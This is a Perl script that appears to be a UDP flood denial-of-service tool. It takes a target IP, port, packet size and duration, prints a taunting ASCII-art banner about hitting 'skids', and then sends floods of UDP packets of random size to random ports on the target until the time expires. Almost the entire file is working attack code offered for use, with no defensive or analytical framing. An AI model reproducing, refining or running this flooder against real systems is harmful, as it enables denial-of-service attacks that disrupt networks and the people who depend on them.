#!/usr/bin/perl

##############
# oViruzzz
##############

use Socket;
use strict;

if ($#ARGV != 3) {
  print "\n\t\t\t***Command must recieve four arguements***\n";
  print "perl uam 69.69.69.69 0 65500 0\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print <<EOTEXT;
────────────────────────────────────────────────────────────
─██████████████─██████─────────██████████████─██████──────────██████─
─██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░██████████████░░██─
─██░░██████████─██░░██─────────██░░██████░░██─██░░░░░░░░░░░░░░░░░░██─
─██░░██─────────██░░██─────────██░░██──██░░██─██░░██████░░██████░░██─
─██░░██████████─██░░██─────────██░░██████░░██─██░░██──██░░██──██░░██─
─██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░██──██░░██──██░░██─
─██████████░░██─██░░██─────────██░░██████░░██─██░░██──██████──██░░██─
─────────██░░██─██░░██─────────██░░██──██░░██─██░░██──────────██░░██─
─██████████░░██─██░░██████████─██░░██──██░░██─██░░██──────────██░░██─
─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░██──────────██░░██─
─██████████████─██████████████─██████──██████─██████──────────██████─
─────────────────────────────────────────────────────────────────────
─────────────────────────────────────────────────────────────────────
─██████████████─██████████████─██████──────────██████─██████████████─
─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████████░░██─██░░░░░░░░░░██─
─██░░██████████─██░░██████░░██─██░░░░░░░░░░░░░░░░░░██─██░░██████████─
─██░░██─────────██░░██──██░░██─██░░██████░░██████░░██─██░░██─────────
─██░░██████████─██░░██──██░░██─██░░██──██░░██──██░░██─██░░██████████─
─██░░░░░░░░░░██─██░░██──██░░██─██░░██──██░░██──██░░██─██░░░░░░░░░░██─
─██████████░░██─██░░██──██░░██─██░░██──██████──██░░██─██░░██████████─
─────────██░░██─██░░██──██░░██─██░░██──────────██░░██─██░░██─────────
─██████████░░██─██░░██████░░██─██░░██──────────██░░██─██░░██████████─
─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──────────██░░██─██░░░░░░░░░░██─
─██████████████─██████████████─██████──────────██████─██████████████─
─────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────────────
─██████████████─██████──████████─██████████─████████████───██████████████─
─██░░░░░░░░░░██─██░░██──██░░░░██─██░░░░░░██─██░░░░░░░░████─██░░░░░░░░░░██─
─██░░██████████─██░░██──██░░████─████░░████─██░░████░░░░██─██░░██████████─
─██░░██─────────██░░██──██░░██─────██░░██───██░░██──██░░██─██░░██─────────
─██░░██████████─██░░██████░░██─────██░░██───██░░██──██░░██─██░░██████████─
─██░░░░░░░░░░██─██░░░░░░░░░░██─────██░░██───██░░██──██░░██─██░░░░░░░░░░██─
─██████████░░██─██░░██████░░██─────██░░██───██░░██──██░░██─██████████░░██─
─────────██░░██─██░░██──██░░██─────██░░██───██░░██──██░░██─────────██░░██─
─██████████░░██─██░░██──██░░████─████░░████─██░░████░░░░██─██████████░░██─
─██░░░░░░░░░░██─██░░██──██░░░░██─██░░░░░░██─██░░░░░░░░████─██░░░░░░░░░░██─
─██████████████─██████──████████─██████████─████████████───██████████████─
──────────────────────────────────────────────────────────────────────────

	 Welcome Too barcode & FantasyLux Server.Lets Slam Some Skids.
EOTEXT

print "\n\033[0;32m[\033[31mTapezServer M\035[0;32m]\n\033[1;32mConnecting To Tapez Server.. ";
sleep 1;
print "\033[0;35m[\033[1;35mDONE\033[1;m]\033[1;35m\nReady .. Set .. and.. \034[1;m[\033[0;36mCONNECTED\033[0;36m]\n\033[1;36mHittingThatSkid \033[0;36m$ip..\033[1;m";
sleep 1;
print "\n\033[0;32mHitting \033[1;32m$ip..\033[1;m"; 

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));} 
  